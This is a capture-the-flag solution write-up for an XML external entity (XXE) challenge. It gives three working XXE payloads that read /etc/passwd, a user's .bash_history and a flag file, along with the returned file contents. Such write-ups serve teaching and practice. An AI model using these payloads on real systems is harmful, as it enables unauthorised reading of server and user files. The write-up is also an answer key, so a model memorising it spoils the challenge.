# How to Solve the Challenge?

Intercept the check availability request using Burp and modify the XML payload to the below one, and send it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<availabilityCheck>
    <item>
        &xxe;
    </item>
</availabilityCheck>
```

This will return the `/etc/passwd` file:

```
item: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
baduser:x:1000:1000:I did delete all my browser history but I am not sure about other histories...:/home/baduser:/bin/bash
```

This basically tells participants to go check the `.bash_history` file (at the home of `baduser`).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/baduser/.bash_history"> ]>
<availabilityCheck>
    <item>
        &xxe;
    </item>
</availabilityCheck>
```

This will return the bash history file which directly points to where the flag is, as such;

```bash
cd ~
ls -la
cd app
nano styles/style.css
cat styles/style.css
exit

cd ~
mkdir top_secret_data
cd top_secret_data
nano CTF_fL4g_m4yb3.txt
cat CTF_fL4g_m4yb3.txt | grep "ATHACKCTF{"
exit
```

Meaning that the players would have to send one more XML payload to retrieve the contents of
`/home/baduser/top_secret_data/CTF_fL4g_m4yb3.txt`, as such:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/baduser/top_secret_data/CTF_fL4g_m4yb3.txt"> ]>
<availabilityCheck>
    <item>
        &xxe;
    </item>
</availabilityCheck>
```

This will return the flag, HOORAY!
